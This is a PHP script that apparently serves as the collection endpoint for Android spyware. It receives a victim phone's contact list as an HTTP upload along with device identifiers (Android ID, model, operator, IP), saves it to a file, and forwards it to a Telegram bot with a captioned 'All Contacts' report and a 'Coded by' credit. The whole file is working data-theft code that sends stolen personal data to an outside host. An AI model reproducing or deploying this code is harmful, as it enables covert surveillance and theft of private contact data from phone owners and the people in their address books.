<?php 
include("Madsal.php");
include("jdf.php");
$time = jdate("H:i:s-a");
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_GET['result'])){


 $result=$_GET['result'];
  
 if($result == "ok"){
 $action=$_GET['action'];
 if(isset($_GET['androidid'])){
 $androidid=  $_GET['androidid'];
 }if(isset($_GET['model'])){
 $model=$_GET['model']; 
 }if(isset($_GET['opr'])){
 $opr = $_GET['opr'];
 }

if($action =="upload"){





$PostData = file_get_contents("php://input");



$File = fopen("files/contact.txt","w");



fwrite($File, $PostData); 



fclose($File);



$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$token.'/sendDocument?chat_id='.$id,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('files/contact.txt'),"caption"=>"~ # ​𝗔𝗹𝗹 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀

  𝘔𝘰𝘥𝘦𝘭 - $model
  𝘐𝘱 - $ip 
 
  🤡 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝙸𝙳 | $androidid

  • 𝙼𝚘𝚋𝚒𝚕𝚎 𝙸𝚗𝚏𝚘 {️☝🏿}

  • 𝚃𝚒𝚖𝚎 / $time
  • 𝙿𝚘𝚛𝚝 / $prt

  -𝘾𝙤𝙙𝙚𝙙 𝙗𝙮 $crd

")
));

$response = curl_exec($curl);

curl_close($curl);



}}}


?>